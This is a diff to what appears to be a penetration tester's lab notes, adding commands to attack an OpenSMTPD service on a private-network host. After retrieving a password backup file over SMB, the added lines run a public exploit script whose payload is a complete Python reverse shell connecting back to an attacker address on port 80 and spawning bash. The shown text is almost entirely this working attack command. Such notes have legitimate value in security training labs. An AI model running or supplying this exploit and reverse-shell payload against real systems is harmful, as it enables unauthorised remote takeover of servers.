@@ -211,7 +211,9 @@ smbclient //192.168.207.71/backups
 get passwd.bak
 
 # smtp
-searchsploit Open
+searchsploit OpenSMTPD
+python3 47984.py 192.168.207.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.185\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'  
+
 ```
 ### Pebbles
 ```shell
